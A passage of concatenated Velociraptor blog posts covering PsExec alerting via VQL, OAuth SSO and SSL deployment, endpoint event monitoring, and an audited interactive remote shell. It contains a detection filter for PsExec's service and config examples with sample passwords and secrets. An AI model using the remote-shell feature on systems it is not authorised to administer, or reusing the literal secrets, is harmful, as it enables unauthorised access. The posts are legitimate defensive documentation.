  "artifact": "Windows.Events.ProcessCreation",
  "client_id": "C.87b19dba006fcddb"
 }
]
```

The watcher efficiently follows the monitoring CSV file to detect new
events. These events are then emitted into the VQL query and
subsequently filtered. When the query processes all rows in the file,
the plugin just sleeps and waits for the file to grow again. The
watch\_monitoring() plugin essentially tails the CSV file as it is being
written. Note that due to the fact that log files are never truncated
and always grow, and that CSV file format is a simple, one row per line
format it is possible to both read and write to the same file without
locking. This makes following a growing log file extremely efficient and
safe - even from another process.

Responding to server side events
================================

The previous query will return a row when psexec is run on the client.
This is a very suspicious event in our environment and we would like to
escalate this by sending us an email.

We can modify the above query to send an email for each event:

``` {.sourceCode .psql}
SELECT * FROM foreach(
   row={
     SELECT * from watch_monitoring(
       client_id='C.87b19dba006fcddb',
       artifact='Windows.Events.ProcessCreation')
    WHERE Name =~ '(?i)psexesvc'
   },
   query={
     SELECT * FROM mail(
       to='admin@example.com',
       subject='PsExec launched on host',
       period=60,
       body=format(format='PsExec execution detected at %v: %v',
                   args=[Timestamp, Commandline])
     )
   })
```

The query sends an email from each event emitted. The message body is
formatted using the format() VQL function and this includes important
information from the generated event. Note that the mail() plugin
restricts the frequency of mails to prevent triggering the mail
server\'s spam filters. So if two psexec executions occur within 60
seconds we will only get one email.

In order for Velociraptor to be able to send mail you must configure
SMTP parameters in the server\'s configuration file. The following
example uses gmail to send mails (other mail providers will have similar
authentication requirements).

``` {.sourceCode .yaml}
Mail:
  server: "smtp.gmail.com"
  auth_username: someuser@gmail.com
  auth_password: zldifhjsdflkjfsdlie
```

The password in the configuration is an application specific password
obtained from
<https://security.google.com/settings/security/apppasswords>

![image](app_password.png)

Tying it all together: Server Side Event Artifacts
==================================================

As always we really want to encapsulate VQL queries in artifact
definitions. This way we can design specific alerts, document them and
invoke them by name. Let us encapsulate the above queries in a new
artifact:

``` {.sourceCode .yaml}
name: Server.Alerts.PsExec
description:  |
   Send an email if execution of the psexec service was detected on any client.

   Note this requires that the Windows.Event.ProcessCreation
   monitoring artifact be collected.

parameters:
  - name: EmailAddress
    default: admin@example.com
  - name: MessageTemplate
    default: |
      PsExec execution detected at %v: %v for client %v

sources:
  - queries:
     - |
       SELECT * FROM foreach(
         row={
           SELECT * from watch_monitoring(
             artifact='Windows.Events.ProcessCreation')
           WHERE Name =~ '(?i)psexesvc'
         },
         query={
           SELECT * FROM mail(
             to=EmailAddress,
             subject='PsExec launched on host',
             period=60,
             body=format(
               format=MessageTemplate,
               args=[Timestamp, CommandLine, ClientId])
          )
       })
```

We create a new directory called my\_artifact\_directory and store that
file inside as psexesvc.yaml. Now, on the server we invoke the artifact
collector and instruct it to also add our private artifacts:

``` {.sourceCode .bash}
$ velociraptor --definitions my_artifact_directory/ \
    --config ~/server.config.yaml \
    --format json \
    artifacts collect Server.Alerts.PsExec
INFO:2018/12/10 21:36:27 Loaded 40 built in artifacts
INFO:2018/12/10 21:36:27 Loading artifacts my_artifact_directory/
[][
 {
  "To": [
    "admin@example.com"
  ],
  "CC": null,
  "Subject": "PsExec launched on host",
  "Body": "PsExec execution detected at \"2018-12-10T03:36:49-08:00\": \"C:\\\\Windows\\\\PSEXESVC.exe\"",
  "Period": 60
 }
]
```

Conclusions
===========

This blog post demonstrates how VQL can be used on the server to create
a full featured incident response framework. Velociraptor does not
dictate a particular workflow, since all its actions are governed by VQL
queries and artifacts. Using the same basic building blocks, users can
fashion their own highly customized incident response workflow. Here is
a brainstorm of possible actions:

1.  An artifact can be written to automatically collect a memory capture
    if a certain event is detected.
2.  Using the http\_client() VQL plugin, when certain events are
    detected on the server open a ticket automatically (using a SOAP or
    JSON API).
3.  If a particular event is detected, immediately shut the machine down
    or quarantine it (by running shell commands on the compromised
    host).

The possibilities are truly endless. Comment below if you have more
interesting ideas and do not hesitate to contribute artifact definitions
to address your real world use cases.

---END OF FILE---

======
FILE: /content/blog/html/2018/12/23/deploying_velociraptor_with_oauth_sso/_index.md
======
---
date: 2018-12-23T04:10:06Z
description:  |
  In the previous post we saw how to set up Velociraptor's GUI over
  SSL. In this post we discuss how to enable Google's SSO authentication for
  Velociraptor identity management.

title: Deploying Velociraptor with OAuth SSO
categories: ["Blog"]
---


In the previous post we saw how to set up Velociraptor\'s GUI over SSL.
This is great, but we still need to create users and assign them
passwords manually. The trouble with user account management is that we
can not enforce 2 factor authentication, or any password policies or any
of the usual enterprise requirements for user account management. It is
also difficult for users to remember yet another password for a separate
system, and so might make the password easily guessable.

Most enterprise systems require an SSO mechanism to manage user accounts
and passwords. Manual user account management simply does not scale!

In this post we discuss how to enable Google\'s SSO authentication for
Velociraptor identity management.

OAuth Identity management
=========================

Velociraptor can use Google\'s oauth mechanism to verify a user\'s
identity. This requires a user to authenticate to Google via their usual
mechanism - if their account requires 2 factor authentication, then
users need to log in this way.

Once the user authenticates to Google, they are redirected back into the
Velociraptor application with a token that allows the application to
request information about the user (for example, the username or email
address).

{{% notice note %}}

OAuth is an authentication protocol. This means Velociraptor can be
pretty confident the user is who they claim they are. This does not
automatically grant them access to the application! A Velociraptor
administrator must still manually grant them access before a user may
log in.

{{% /notice %}}

Before we can use Google for Authentication, we need to register our
Velociraptor deployment as an OAuth App with Google. Unfortunately
Google is not known for having intuitive and easy to follow processes so
actually doing this is complicated and bounces through many seemingly
unrelated Google products and services. This post attempts to document
this process at it exists in this time.

For our example we assume that our server is located at
<https://velociraptor.rekall-innovations.com> as we continue on from our
example in the last post (i.e. it is already configured to use SSL).

Registering Velociraptor as an OAuth application
================================================

The first step is to register Velociraptor as an OAuth app. We do this
by accessing the Google cloud console at
<https://console.cloud.google.com> . You will need to set up a cloud
account first and create a cloud project. Although in this example we do
not necessarily need to host our application on Google cloud or have
anything to do with Google cloud, OAuth seems to exist within the Google
cloud product.

Our ultimate goal is to obtain OAuth credentials to give our
Velociraptor app, but we have to have a few things set up first. The
cloud console is fairly confusing so I usually use the search feature to
find exactly what I need. Searching for \"oauth\" at the search bar
indicates that it is under \"APIs and Services\".

We need to set up the OAuth consent screen first - in which we give our
application a name to be presented to the user by the OAuth flow:

![](1.png)

Further down we need to provide an authorized domain

![](2.png)

In order to add an Authorized domain we need to *verify it*. Google\'s
help pages explain it further:

{{% notice tip "Authorized domains" %}}

To protect you and your users, Google restricts your OAuth 2.0
application to using Authorized Domains. If you have verified the domain
with Google, you can use any Top Private Domain as an Authorized Domain.

{{% /notice %}}

And this links to <https://www.google.com/webmasters/tools/home> which
again seems completely unrelated to OAuth, Velociraptor or even a web
app (the web masters product is supposed to help sites increase their
search presence).

Within this product we now need to \"Add a property\":

![](3.png)

Hidden within the settings menu there is an option \"Verification
Details\" which allows you to verify that you own the domain. If you
purchased your domain from Google Domains then it should already be
verified - otherwise you can set some TXT records to prove you own the
domain.

![](4.png)

After all this we can go back to the cloud console and Create
Credentials/OAuth client ID:

![](5.png)

Now select \"Web App\" and we must set the \"Authorized redirect URIs\"
to <https://velociraptor.rekall-innovations.com/auth/google/callback>
-This is the URL that successful OAuth authentication will direct to.
Velociraptor accepts this redirect and uses it to log the user on.

![](6.png)

{{% notice note %}}

The UI is a bit confusing here - you must press enter after typing the
redirect URL to have it registered **before** you hit *Create* otherwise
it misses that you typed it completely. I spent some time stumped on
this UI bug.

{{% /notice %}}

If all goes well the Google cloud console will give us a client ID and a
client secret. We can then copy those into the Velociraptor
configuration file under the GUI section:

``` {.sourceCode .yaml}
GUI:
  google_oauth_client_id: 1234xxxxxx.apps.googleusercontent.com
  google_oauth_client_secret: qsadlkjhdaslkjasd
  public_url: https://velociraptor.rekall-innovations.com/

logging:
  output_directory: /var/log/velociraptor/
  separate_logs_per_component: true
```

In the above config we also enabled logging (which is important for a
secure application!). The separate\_logs\_per\_component option will
create a separate log file for the GUI, Frontend as well as important
Audit related events.

Now we can start the Velociraptor frontend:

``` {.sourceCode .bash}
$ velociraptor --config server.config.yaml frontend
```

Connecting using the browser goes through the familiar OAuth flow and
arrives at this Velociraptor screen:

![](7.png)

The OAuth flow ensures the user\'s identity is correct but does not give
them permission to log into Velociraptor. Note that having an OAuth
enabled application on the web allows anyone with a Google identity to
authenticate to the application but the user is still required to be
authorized. We can see the following in the Audit logs:

``` {.sourceCode .json}
{
  "level": "error",
  "method": "GET",
  "msg": "User rejected by GUI",
  "remote": "192.168.0.10:40570",
  "time": "2018-12-21T18:17:47+10:00",
  "user": "mike@velocidex.com"
}
```

In order to authorize the user we must explicitly add them using the
velociraptor admin tool:

``` {.sourceCode .bash}
$ velociraptor --config ~/server.config.yaml user add mike@velocidex.com
Authentication will occur via Google - therefore no password needs to be set.
```

Note that this time, Velociraptor does not ask for a password at all,
since authentication occurs using Google\'s SSO. If we hit refresh in
the browser we can now see the Velociraptor application:

![](8.png)

We can see that the logged in user is authenticated by Google, and we
can also see their Google avatar at the top right for some more eye
candy :-).


{{% notice note Thanks %}}

Shouts to the folks from [Klein & Co](https://www.kleinco.com.au/) who
sponsored this exciting feature!.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/blog/html/2018/12/11/velociraptor_interactive_shell.md
======
---
date: 2018-12-11T04:10:06Z
description:  |
  One of the interesting new features in the latest release of
  Velociraptor is an interactive shell. One can interact with the end
  point over the standard Velociraptor communication mechanism - an
  encrypted and authenticated channel.

title: Velociraptor Interactive Shell
categories: ["Blog"]
noindex: true
---


One of the interesting new features in the latest release of
Velociraptor is an interactive shell. One can interact with the end
point over the standard Velociraptor communication mechanism - an
encrypted and authenticated channel.

This feature is implemented by utilizing the Velociraptor event
monitoring, server side VQL queries. This post explores how these
components come together to deliver a responsive, interactive workflow.

Endpoint shell access
=====================

Although we generally try to avoid it, sometimes the easiest way to
extract certain information is to run a command and parse its output.
For example, consider the windows ipconfig command. It is possible to
extract this information using win32 apis but this requires additional
code to be written in the client. The ipconfig command is guaranteed to
be available. Sometimes running a command and parsing its output is the
easiest option.

The GRR client has a client action which can run a command. However that
client action is restricted to run a whitelist of commands, since GRR
chose to prevent the running of arbitrary commands on the endpoint. In
practice, though it is difficult to add new commands to the whitelist
(and rebuild and deploy new clients that have the updated whitelist).
But users need to run arbitrary commands (including their own third
party tools) anyway. So in the GRR world, most people use \"python
hacks\" routinely to run arbitrary commands.

When we came to redesign Velociraptor we pondered if arbitrary command
execution should be included or not. To be sure, this is a dangerous
capability - effectively giving Velociraptor root level access on the
endpoint. In our experience restricting it in an arbitrary way (as was
done in GRR) is not useful because it is harder adapt to real incident
response needs (you hardly ever know in advance what is needed at 2am in
the morning when trying to triage an incident!).

Other endpoint monitoring tools also have a shell interface (For example
Carbon Black). It is understood that this feature is extremely powerful,
but it is necessary sometimes.

Velociraptor mitigates this risk in a few ways:

1.  If an organization deems the ability to run arbitrary commands too
    dangerous, they can completely disable this feature in the client\'s
    configuration.
2.  Every shell command run by the client is audited and its output is
    archived. Misuse can be easily detected and investigated.
3.  This feature is considered high risk and it is not available via the
    GUI. One must use the velociraptor binary on the server itself to
    run the interactive shell.

Interactive Shell
=================

The interactive shell feature is accessed by issuing the shell command
to the velociraptor binary:

``` {.sourceCode .bash}
$ velociraptor --config ~/server.config.yaml shell C.7403676ab8664b2b
C.7403676ab8664b2b (trek) >ls /
Running ls / on C.7403676ab8664b2b
Received response at 2018-12-11 13:12:35 +1000 AEST - Return code 0

bin
boot
core
data
dev

C.7403676ab8664b2b (trek) >id
Running id on C.7403676ab8664b2b
Received response at 2018-12-11 13:13:05 +1000 AEST - Return code 0

uid=1000(mic) gid=1000(mic) groups=1000(mic),4(adm),24(cdrom),27(sudo)

C.7403676ab8664b2b (trek) >whoami
Running whoami on C.7403676ab8664b2b
Received response at 2018-12-11 13:13:10 +1000 AEST - Return code 0

mic
```

As you can see it is pretty straight forward - type a command, the
command is sent to the client, and the client responds with the output.

How does it work?
=================

The main components are shown in the figure below. Note that the shell
process is a different process from the frontend:

![image](interactive_shell_workflow.png)

The workflow starts when a user issues a command (for example \"ls -l
/\") on the terminal. The shell process schedules a VQL query for the
client:

``` {.sourceCode .psql}
SELECT now() as Timestamp, Argv, Stdout,
     Stderr, ReturnCode FROM execve(argv=['ls', '-l', '/'])
```

However, this query is scheduled as part of the monitoring flow -which
means it\'s response will be sent and stored with the monitoring logs.
As soon as the shell process schedules the VQL query the frontend is
notified and the client is woken. Note that due to Velociraptor\'s near
instantaneous communication protocol this causes the client to run the
command almost immediately.

The client executes the query which returns one or more rows containing
the Stdout of the process. The client will then send the response to the
server as a monitoring event. The frontend will then append the event to
a CSV file.

After sending the initial client query, the interactive shell process
will issue a watch VQL query to watch for the shell response:

``` {.sourceCode .psql}
SELECT ReturnCode, Stdout, Stderr, Timestamp, Argv
FROM watch_monitoring(client_id=ClientId, artifact='Shell')
```

The process now blocks until this second query detects the response
arrived on the monitoring queue. Now we simply display the result and go
back to the interactive prompt.

Note that the interactive shell is implemented using the same basic
building blocks that Velociraptor offers:

1.  Issuing client VQL queries.
2.  Waking the client immediately gives instant results (no need for
    polling).
3.  Utilizing the event monitoring flow to receive results from queries
    immediately.
4.  Writing server side event queries to watch for new events, such as
    responses from the client.

Note that the frontend is very simple and does no specific processing of
the interactive shell, the feature is implemented completely within the
interactive shell process itself. This design lowers the load on the
frontends since their job is very simple, but enables complex post
processing and interaction to be implemented by other processes.

Auditing
========

We mentioned previously that running shell commands on endpoints is a
powerful feature and we need to audit its use closely. Since shell
command output is implemented via the monitored event queues it should
be obvious that we can monitor all such commands by simply watching the
Shell artifact event queue:

``` {.sourceCode .bash}
$ velociraptor query "select * from watch_monitoring(artifact='Shell')"
[
 {
  "Argv": "\"{\\\"Argv\\\":[\\\"id\\\"]}\"",
  "Artifact": "Shell",
  "ClientId": "C.7403676ab8664b2b",
  "ReturnCode": "0",
  "Stderr": "\"\"",
  "Stdout": "\"uid=1000(mic) gid=1000(mic) groups=1000(mic)\\n\"",
  "Timestamp": "1544499929"
 }
]
```

We can easily write an artifact that escalates any use of the
interactive shell by sending the admin an mail (See previous blog post).
This way we can see if someone misused the feature. Alternatively we
may simply archive the event queue CSV file for long term auditing of
any interactive shell use.

---END OF FILE---

======
FILE: /content/blog/html/2018/12/22/configuring_velociraptor_for_ssl/_index.md
======
---
date: 2018-12-22T04:10:06Z
description:  |
  This post describes how to deploy Velociraptor with SSL on a cloud VM.

title: Configuring Velociraptor for SSL
categories: ["Blog"]
---


We have previously seen how to deploy a new Velociraptor server. For a
simple deployment we can have Velociraptor server and clients
provisioned in minutes.

Usually we deploy a specific Velociraptor deployment on our DFIR
engagements. We use cloud resources to provision the server and have the
clients connect to this cloud VM. A proper secure deployment of
Velociraptor will use SSL for securing both client communication and
protecting the web GUI.

In the past provisioning an SSL enabled web application was complex and
expensive - you had to create certificate signing requests, interact
with a CA. Pay for the certificates, then configure the server. In
particular you had to remember to renew the cert in 2 years or your
website suddenly broke!

Those days are over with the emergence of Lets Encrypt! and autocert.
These days applications can automatically provision their own
certificates. Velociraptor can manage its own certificates, fully
automatically - and then renew its certificates when the time comes with
no user intervention required.

In this blog post we will see how to configure a new Velociraptor server
in a cloud VM.

Setting up a domain
===================

The first step in deploying an SSL enabled web application is to have a
domain name. SSL verifies the authenticity of a web site by its DNS
name.

We go over to Google Domains and buy a domain. In this post I will be
using the domain rekall-innovations.com.

Provisioning a Virtual Machine
==============================

Next we provision an Ubuntu VM from any cloud provider. Depending on
your deployment size your VM should be large enough. An 8 or 16Gb VM
should be sufficient for around 5-10k clients. Additionally we will need
sufficient disk space to hold the data we will collect. We recommend to
start with a modest amount of storage and then either backup data as it
gets collected or increase the storage volume as needed.

Our virtual machine will receive connections over ports 80 and 443.

::: {.note}
::: {.admonition-title}
Note
:::

When using SSL both the client communication *and* the GUI are served
over the same ports to benefit from SSL transport encryption.
:::

When we deploy our Virtual Machine we may choose either a static IP
address or allow the cloud provider to assign a dynamic IP address. We
typically choose a dynamic IP address and so we need to configure
Dynamic DNS.

Go to the Google Domains dashboard and create a new dynamic DNS for your
domain. In our example we will use velociraptor.rekall-innovations.com
as our endpoint address.

![image](1.png)

After the dynamic address is created, we can get the credentials for
updating the IP address.

![image](2.png)

Next we install ddclient on our VM. This will update our dynamic IP
address whenever the external interface changes. Configure the file
\`/etc/ddclient.conf\`:

``` {.sourceCode .text}
protocol=dyndns2
use=web
server=domains.google.com
ssl=yes
login=X13342342XYZ
password='slk43521kj'
velociraptor.rekall-innovations.com
```

Next configure the service to start:

``` {.sourceCode .text}
# Configuration for ddclient scripts
# generated from debconf on Tue Oct 23 20:25:23 AEST 2018
#
# /etc/default/ddclient

# Set to "true" if ddclient should be run every time DHCP client ('dhclient'
# from package isc-dhcp-client) updates the systems IP address.
run_dhclient="false"

# Set to "true" if ddclient should be run every time a new ppp connection is
# established. This might be useful, if you are using dial-on-demand.
run_ipup="false"

# Set to "true" if ddclient should run in daemon mode
# If this is changed to true, run_ipup and run_dhclient must be set to false.
run_daemon="true"

# Set the time interval between the updates of the dynamic DNS name in seconds.
# This option only takes effect if the ddclient runs in daemon mode.
daemon_interval="300"
```

Run dhclient and check that it updates the address correctly.

Configuring Velociraptor for SSL
================================

Now comes the hard part! We need to configure Velociraptor to use SSL.
Edit the following in your server.config.yaml file (if you do not have
one yet you can generate one using velociraptor config
generate \> server.config.yaml ):

``` {.sourceCode .yaml}
Client:
   server_urls:
   - https://velociraptor.rekall-innovations.com/

autocert_domain: velociraptor.rekall-innovations.com
autocert_cert_cache: /etc/velociraptor_cache/
```

The autocert\_domain parameter tells Velociraptor to provision its own
cert for this domain automatically. The certificates will be stored in
the directory specified by autocert\_cert\_cache. You don\'t have to
worry about rotating the certs, Velociraptor will automatically renew
them.

Obviously now the clients need to connect to the control channel over
SSL so we also need to direct the client\'s server\_urls parameter to
the SSL port.

Lets start the frontend (We need to start Velociraptor as root because
it must be able to bind to port 80 and 443):

``` {.sourceCode .bash}
$ sudo velociraptor --config server.config.yaml frontend -v

[INFO] 2018-12-22T17:12:42+10:00 Loaded 43 built in artifacts
[INFO] 2018-12-22T17:12:42+10:00 Increased open file limit to 999999
[INFO] 2018-12-22T17:12:42+10:00 Launched gRPC API server on 127.0.0.1:8888
[INFO] 2018-12-22T17:12:42+10:00 Autocert specified - will listen on ports 443 and 80. I will ignore specified GUI port at 8889
[INFO] 2018-12-22T17:12:42+10:00 Autocert specified - will listen on ports 443 and 80. I will ignore specified Frontend port at 8889
[INFO] 2018-12-22T17:12:42+10:00 Frontend is ready to handle client requests using HTTPS
```

If all goes well we now can point our browser to
https://velociraptor.rekall-innovations.com/ and it should just work.
Don\'t forget to provision a user and password using:

``` {.sourceCode .bash}
$ velociraptor --config server.config.yaml user add mic
```

Notes
=====

The autocert configuration is very easy to do but there are a few
caveats:

1.  Both ports 80 and 443 must be accessible over the web. This is
    needed because Letsencrypt\'s servers need to connect to our domain
    name in order to verify our domain ownership.
2.  It is not possible to change the ports from port 80 and 443 due to
    limitations in Letsencrypt\'s ACME protocol. This is why we can not
    have more than one Velociraptor deployment on the same IP currently.

We have seen how easy it is to deploy secure Velociraptor servers. In
the next post we will discuss how to enhance security further by
deploying two factor authentication with Google\'s Single Sign On (SSO).

::: {.note}
::: {.admonition-title}
Note
:::

This feature will be available in the upcoming 0.27 release. You can try
it now by building from git head.
:::

---END OF FILE---

======
FILE: /content/blog/html/2018/12/09/more_on_client_event_collection.md
======
---
date: 2018-12-09T04:10:06Z
description:  |
  Previously we have seen that Velociraptor can monitor client events
  using Event Artifacts. To recap, Event Artifacts are simply artifacts
  which contain event VQL queries. Velociraptor's VQL queries do not
  have to terminate by themselves - instead VQL queries may run
  indefinitely, trickling results over time.

  This post takes another look at event queries and demonstrates how
  these can be used to implement some interesting features.

title: More on client event collection
categories: ["Blog"]
---

Periodic Event queries
======================

The simplest kind of events are periodically generated events. These are
created using the clock() VQL plugin. This is a simple event plugin
which just emits a new row periodically.

``` {.sourceCode .bash}
$ velociraptor query "select Unix from clock(period=5)" --max_wait 1
[
 {
   "Unix": 1544339715
 }
][
 {
   "Unix": 1544339720
 }
]^C
```

The query will never terminate, instead the clock() plugin will emit a
new timestamp every 5 seconds. Note the \--max\_wait flag which tells
Velociraptor to wait at least for 1 second in order to batch rows before
reporting them.

This query is not very interesting! Let\'s do something more
interesting. GRR has a feature where each client sends its own CPU use
and memory footprint sampled every minutes to the server. This is a
really useful feature because it can be used to make sure the client\'s
impact on the host\'s performance is minimal.

Let us implement the same feature with a VQL query. What we want is to
measure the client\'s footprint every minute and send that to the
server:

``` {.sourceCode .psql}
SELECT * from foreach(
 row={
   SELECT UnixNano FROM clock(period=60)
 },
 query={
   SELECT UnixNano / 1000000000 as Timestamp,
          Times.user + Times.system as CPU,
          MemoryInfo.RSS as RSS
   FROM pslist(pid=getpid())
 })
```

This query runs the clock() VQL plugin and for each row it emits, we run
the pslist() plugin, extracting the total CPU time (system + user) used
by our own pid (i.e. the Velociraptor client).

We can now encapsulate this query in an
[artifact](/blog/html/reference/artifacts.html#generic-client-stats) and
collect it:

``` {.sourceCode .bash}
$ velociraptor artifacts collect Generic.Client.Stats --max_wait 1 --format json
[][
  {
  "CPU": 0.06999999999999999,
  "RSS": 18866176,
  "Timestamp": 1544340582.9939497
  }
][
  {
  "CPU": 0.09,
  "RSS": 18866176,
  "Timestamp": 1544340602.9944408
  }
]^C
```

::: {.note}
::: {.admonition-title}
Note
:::

You must specify the \--format json to be able to see the results from
event queries on the command line. Otherwise Velociraptor will try to
get all the results so it can format them in a table and never return
any results.
:::

Installing the event collector.
===============================

In order to have clients collect this event, we need to add the artifact
to the server. Simply add the YAML file into a directory on the server
and start the server with the \--definitions flag. Then simply add the
event name to the Events clause of the server configuration. When
clients connect to the server they will automatically start collecting
these events and sending them to the server:

``` {.sourceCode .bash}
$ velociraptor --definitions path/to/my/artifacts/ frontend
```

``` {.sourceCode .yaml}
Events:
  artifacts:
  - Generic.Client.Stats
  version: 2
```

Note that we do not need to redeploy any clients, modify any code or
recompile anything. We simply add the new artifact definition and
clients will automatically start monitoring and feeding back our
information.

The data is sent to the server where it is stored in a file (Events are
stored in a unique file for each day).

For example, the path
/var/lib/velociraptor/clients/C.772d16449719317f/monitoring/Artifact%20Generic.Client.Stats/2018-12-10
stores all events collected from client id C.772d16449719317f for the
Generic.Client.Stats artifact on the day of 2018-12-10.

In the next blog post we will demonstrate how these events can be post
processed and acted on. It is important to note that the Velociraptor
server does not interpret the collected monitoring events at all -they
are simply appended to the daily log file (which is a CSV file).

The CSV file can then be imported into basically any tool designed to
work with tabular data (e.g. spreadsheets, databases, BigQuery etc). CSV
is almost universally supported by all major systems.

``` {.sourceCode .text}
Timestamp,CPU,RSS
1544363561.8001275,14.91,18284544
1544363571.8002906,14.91,18284544
1544363581.8004665,14.920000000000002,18284544
1544363591.8007126,14.920000000000002,18284544
1544363601.8008528,14.920000000000002,18284544
```

---END OF FILE---

======
FILE: /content/blog/html/2018/11/13/velociraptor_training_at_nzitf.md
======
---
date: 2018-11-13T04:10:06Z
description: |
  We are very excited to run this full day training workshop at the New
  Zealand Internet Engineering Task Force (NZITF) conference.

title: Velociraptor training at NZITF
categories: ["Blog"]
---

# Velociraptor training at NZITF

We are very excited to run this full day training workshop at the New
Zealand Internet Engineering Task Force (NZITF) conference.

The training material can be downloaded here [\"Velociraptor NZITF
training\"](/resources/nzitf_velociraptor.pdf).

---END OF FILE---

======
FILE: /content/blog/html/2018/11/09/event_queries_and_endpoint_monitoring/_index.md
======
---
date: 2018-11-09T04:10:06Z
description: |
  In previous posts we have seen how Velociraptor can run artifacts to
  collect information from hosts. For example, we can collect WMI
  queries, user accounts and files.

  However it would be super awesome to be able to do this collection in
  real time, as soon as an event of interest appears on the host, we
  would like to have that collected on the server. This post describes
  the new event monitoring framework and shows how Velociraptor can
  collect things such as event logs, process execution and more in real
  time.

title: Event Queries and Endpoint Monitoring
categories: ["Blog"]
---



Why monitor endpoint events? Recording end point event information on
the server gives a bunch of advantages. For one, the server keeps a
record of historical events, which makes going back to search for these
easy as part of an incident response activity.

For example, Velociraptor can keep a running log of process execution
events for all clients, on the server. If a particular executable is
suspected to be malicious, we can now go back and search for the
execution of that process in the past on the infected machine (for
establishing the time of infection), as well as search the entire
deployment base for the same binary execution to be able identify
lateral movement and wider compromises.

How are events monitored?
=========================

Velociraptor relies heavily on VQL queries. A VQL query typically
produces a single table of multiple rows. For example, the query:

``` {.sourceCode .sql}
SELECT Name, CommandLine FROM pslist()
```

Returns a single row of all running processes, and then returns.

However, VQL queries do not have to terminate at all. If the VQL plugin
they are calling does not terminate, the VQL query will continue to run
and pass events in partial results to the VQL caller.

Event queries are just regular VQL queries which do not terminate
(unless cancelled) returning rows whenever an event is generated.

![image](1.png)

Consider the parse\_evtx() plugin. This plugin parses an event log file
and returns all events in it. We can then filter events and return
specific events of interest. The following query returns all the service
installation events and terminates:

``` {.sourceCode .console}
F:\>velociraptor.exe query "SELECT EventData, System.TimeCreated.SystemTime from
   parse_evtx(filename='c:/windows/system32/winevt/logs/system.evtx') where
   System.EventId.value = '7045'"
[
 {
  "EventData": {
   "AccountName": "",
   "ImagePath": "system32\\DRIVERS\\VBoxGuest.sys",
   "ServiceName": "VirtualBox Guest Driver",
   "ServiceType": "kernel mode driver",
   "StartType": "boot start"
  },
  "System.TimeCreated.SystemTime": "2018-11-10T06:32:34Z"
 }
]
```

The query specifically looks at the 7045 event [\"A service was
installed in the
system\"](http://www.eventid.net/display.asp?eventid=7045&source=service+control+manager)

Lets turn this query into an event query:

``` {.sourceCode .console}
F:\>velociraptor.exe query "SELECT EventData, System.TimeCreated.SystemTime from
   watch_evtx(filename='c:/windows/system32/winevt/logs/system.evtx') where
   System.EventId.value = '7045'" --max_wait 1
[
  "EventData": {
    "AccountName": "",
    "ImagePath": "C:\\Users\\test\\AppData\\Local\\Temp\\pmeFF0E.tmp",
    "ServiceName": "pmem",
    "ServiceType": "kernel mode driver",
    "StartType": "demand start"
  },
  "System.TimeCreated.SystemTime": "2018-11-10T04:57:35Z"
  }
]
```

The watch\_evtx() plugin is the event watcher equivalent of the
parse\_evtx() plugin. If you ran the above query, you will notice that
Velociraptor does not terminate. Instead it will show all existing
service installation events in the log file, and then just wait in the
console.

If you then install a new service (in another terminal), for example
using winpmem.exe -L, a short time later you should see the event
reported by Velociraptor as in the above example. You will notice that
the watch\_evtx() plugin emits event logs as they occur, but
Velociraptor will try to group the events into batches. The max\_wait
flag controls how long to wait before releasing a partial result set.

Employing event queries for client monitoring
=============================================

The above illustrates how event queries work, but to actually be able to
use these we had to implement the Velociraptor event monitoring
framework.

Normally, when we launch a `CollectVQL` flow, the client executes the
query and returns the result to the flow. Clearly since event queries
never terminate, we can not run them in series (because the client will
never be able to do anything else). The Velociraptor client has a table
of executing event queries which are run in a separate thread. As these
queries return more results, the results are sent back to the server.

We also wanted to be able to update the events the clients are
monitoring on the fly (without a client restart). Therefore we needed a
way to be able to update the client\'s event table. This simply cancels
current event queries, and installs new queries in their place.

![image](2.png)

As events are generated by the Event Table, they are sent back to the
server into the Monitoring flow. This flow is automatically created for
each client. The monitoring flow simply writes events into the client\'s
VFS. Therefore, events are currently simply recorded for each client. In
future there will be a mechanism to post process event and produce
alerts based on these.

Process Execution logs
======================

One of the most interesting event plugins is the WMI eventing plugin.
This allows Velociraptor to install a temporary WMI event listener. For
example, we can install a listener for new process creation:

``` {.sourceCode .console}
// Convert the timestamp from WinFileTime to Epoch.
SELECT timestamp(epoch=atoi(
  string=Parse.TIME_CREATED) / 10000000 - 11644473600 ) as Timestamp,
  Parse.ParentProcessID as PPID,
  Parse.ProcessID as PID,
  Parse.ProcessName as Name, {
    SELECT CommandLine
    FROM wmi(
      query="SELECT * FROM Win32_Process WHERE ProcessID = " +
          format(format="%v", args=Parse.ProcessID),
      namespace="ROOT/CIMV2")
  } AS CommandLine
  FROM wmi_events(
       query="SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE
              TargetInstance ISA 'Win32_Process'",
       wait=5000000,   // Do not time out.
       namespace="ROOT/CIMV2")
```

The wmi\_events() plugin installs an event listener into WMI and
therefore receives events from the OS about new process creation events.
Unfortunately these events, do not contain a lot of information about
the process. They only provide the ProcessID but not the full command
line. The above query executes a second subquery to retrieve the command
line for the process. We also parse the timestamp and convert it into a
more standard epoch based timestamp.

Specifying what should the client monitor
=========================================

We have seen how Event VQL queries can generate events for the server.
However, this is difficult for Velociraptor\'s end users to directly
use. Who can really remember the full query?

As we have shown previously, Velociraptor\'s Artifacts are specifically
designed to solve this issue. Artifacts encapsulate a VQL query so it
can be called by name alone.

For example, the Windows.Events.ProcessCreation artifact encapsulates
the above query in one easy to remember name.

To specify what clients should collect, users simply need to name the
event artifacts that should be monitored. Currently this is done in the
server configuration (in future this may be done via the GUI).

``` {.sourceCode .yaml}
Events:
  artifacts:
  - Windows.Events.ServiceCreation
  - Windows.Events.ProcessCreation
  version: 1
```

The event table version should be incremented each time the monitored
event list is updated. This forces all clients to refresh their event
tables.

How does it look like in the GUI?
=================================

The Monitoring flow simply writes files into the client\'s VFS. This
allows these to be downloaded and post processed outside of
Velociraptor.

![image](3.png)

Conclusions
===========

Adding event monitoring to Velociraptor is a great step forward. Even
just keeping the logs around is extremely helpful for incident response.
There is a lot of value in things like process execution logging, and
remote event log forwarding. We will cover some more examples of event
log monitoring in future blog posts. Until then, have a play and provide
feedback as usual by filing issues and feature requests.

---END OF FILE---

======
FILE: /content/blog/html/2018/08/20/velociraptor_artifacts/_index.md
======
---
date: 2018-08-20T04:10:06Z
description:  |
  We are super excited to introduce this point release of Velociraptor
  (0.2.2) which introduces the concept of Velociraptor Artifacts for the
  first time. This post is about what artifacts are, what they do and
  how can you use them.

title: Velociraptor Artifacts
categories: ["Blog"]
---

First a bit of history. When we first started writing endpoint
